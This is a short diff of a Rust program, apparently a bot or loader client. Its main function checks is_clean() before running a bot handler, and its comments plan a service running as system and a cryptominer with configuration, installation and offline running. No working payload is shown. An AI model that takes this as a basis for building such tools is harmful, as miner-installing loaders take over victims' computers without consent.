@@ -111,7 +111,6 @@ macro_rules! tag {
 
 #[tokio::main]
 async fn main() {
-    // first off - we should only be ran by service - as system
     if !is_clean() {
         exit_1();
     }
@@ -145,9 +144,6 @@ async fn main() {
         bot_handler.run_handler().await;
     };
 }
-
-//? add function that updates the miner config ( and then ? - it)
-//? add miner configuration, installation and full run - offline possible - name of miner is constant that should be included in constants
 
 // add mutexes IN client - loader mainly run as service  - client - mutex by version
 // add error in terminal collecting
